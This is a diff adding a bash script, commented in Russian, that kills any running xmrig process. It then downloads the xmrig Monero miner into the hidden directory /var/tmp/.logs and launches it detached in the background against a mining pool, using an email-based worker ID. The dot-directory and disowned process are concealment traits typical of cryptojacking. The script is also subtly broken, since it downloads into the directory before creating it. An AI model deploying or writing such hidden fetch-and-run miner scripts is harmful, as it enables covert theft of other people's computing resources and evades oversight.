@@ -1,0 +1,47 @@
+#!/bin/bash
+
+# Ищем запущенные процессы xmrig
+process=$(pgrep -fl xmrig)
+
+if [ -n "$process" ]; then
+    echo "Найден процесс xmrig:"
+    echo "$process"
+    echo "Выберите действие:"
+    echo "1) Убить процесс и начать скачивание новой версии"
+    echo "2) Отменить запуск скрипта"
+    read -p "Ваш выбор: " choice
+
+    if [ "$choice" == "1" ]; then
+        # Убиваем процесс xmrig
+        pkill -f xmrig
+        echo "Процесс xmrig убит. Начинаем скачивание..."
+    else
+        echo "Скрипт отменен."
+        exit 0
+    fi
+else
+    echo "Процесс xmrig не найден. Начинаем скачивание новой версии..."
+fi
+
+# Создаем скрытый терминал для скачивания и запуска
+(
+    # Скачиваем архив xmrig
+    wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz -O /var/tmp/.logs/xmrig.tar.gz
+
+    # Создаем директорию, если её нет
+    mkdir -p /var/tmp/.logs
+
+    # Распаковываем архив
+    tar -xzf /var/tmp/.logs/xmrig.tar.gz -C /var/tmp/.logs/
+
+    # Переходим в директорию
+    cd /var/tmp/.logs/xmrig-6.22.0
+
+    # Делаем файл исполняемым
+    chmod +x ./xmrig
+
+    # Запускаем xmrig
+    ./xmrig --coin XMR --url "xmr.kryptex.network:7777" --user "xmr-$(shuf -i 100000-999999 -n 1)/fintafixgames@gmail.com"
+) & disown
+
+echo "Скачивание и запуск xmrig происходит в фоновом режиме."
